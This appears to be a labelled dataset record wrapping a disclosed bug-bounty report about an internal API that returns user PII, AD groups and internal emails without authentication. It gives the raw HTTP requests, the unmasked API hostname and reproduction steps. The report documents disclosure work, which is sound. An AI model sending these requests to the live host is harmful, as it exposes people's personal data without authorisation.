@@ -1,0 +1,64 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "matrixsoftsec ",
+    "title": "Unauthenticated access to internal API at\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588.edu  [HtUS]",
+    "content": "\nOverview:\nThere are multiple API calls using which an attacker user is able to gain unauthenticated access to internal API\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588\u2588\u2588.edu via Azure API url appg3entcalapi.azurewebsites.net.\nThe access to\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588\u2588\u2588.edu is via microsoft and only allows internal users to access it.\nThe appg3entcalapi.azurewebsites.net is listed as the API under the javascript located at https://eventscalendar.\u2588\u2588\u2588\u2588.edu/app.js\n\u2588\u2588\u2588\u2588\u2588\u2588\nSteps to reproduce:\n(I) Vulnerable Request: Disclose PII of internal users-\nCode 492 Bytes\n1GET /api/person/Default.GetAllPersons HTTP/1.1\n2Host: appg3entcalapi.azurewebsites.net\n3Dnt: 1\n4Upgrade-Insecure-Requests: 1\n5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36\n6Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n7Accept-Encoding: gzip, deflate\n8Accept-Language: en-US,en;q=0.9\n9Connection: close\n10Content-Length: 2\n11\n12{}\nCopy the above vulnerable request to your BURP repeater tab and fire the request.\nNotice the 200 OK response disclosing the details.\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n(II) Vulnerable Request: Disclose adgroups & internal emails-\nCode 408 Bytes\n1GET /api/AdGroup HTTP/1.1\n2Host: appg3entcalapi.azurewebsites.net\n3Dnt: 1\n4Upgrade-Insecure-Requests: 1\n5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36\n6Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n7Connection: close\n8Content-Length: 2\n9\n10{}\nCopy the above vulnerable request to your BURP repeater tab and fire the request.\nNotice the 200 OK response disclosing the details.\n\u2588\u2588\u2588\u2588\u2588\n(III) Vulnerable Request:\nCode 437 Bytes\n1GET /api/EventType HTTP/1.1\n2Host: appg3entcalapi.azurewebsites.net\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n5Accept-Encoding: gzip, deflate\n6Accept-Language: en-US,en;q=0.9\n7Connection: close\n8Content-Length: 2\n9\n10{}\nCopy the above vulnerable request to your BURP repeater tab and fire the request.\nNotice the 200 OK response disclosing the details.\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nUnauthenticated access to internal API at\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.edu\n\n",
+    "severity": [
+        7.5,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Improper Authorization"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1721414100,
+    "report_url": "https://hackerone.com/reports/1627980",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "LOW",
+    "vuln_category": "API",
+    "steps": [
+        [
+            1,
+            "Send a GET request to '/api/person/Default.GetAllPersons' on 'appg3entcalapi.azurewebsites.net' without authentication."
+        ],
+        [
+            2,
+            "Observe the 200 OK response containing PII of internal users."
+        ],
+        [
+            3,
+            "Send a GET request to '/api/AdGroup' on 'appg3entcalapi.azurewebsites.net' without authentication."
+        ],
+        [
+            4,
+            "Observe the 200 OK response containing adgroups and internal emails."
+        ],
+        [
+            5,
+            "Send a GET request to '/api/EventType' on 'appg3entcalapi.azurewebsites.net' without authentication."
+        ],
+        [
+            6,
+            "Observe the 200 OK response containing event type details."
+        ]
+    ],
+    "vuln_description": "Unauthenticated access to internal API endpoints at 'appg3entcalapi.azurewebsites.net' allows attackers to retrieve sensitive information including PII of internal users, adgroups, internal emails, and event types without any authentication.",
+    "reason": "The vulnerability involves straightforward unauthenticated API calls without any complex interactions or state manipulations. The endpoints are directly accessible and do not require any advanced techniques to exploit.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "idor_detectable": false,
+    "authnz_byppass_detectable": true,
+    "is_simple_payload": false,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "idor_detectable": false,
+        "authnz_byppass_detectable": true
+    }
+}
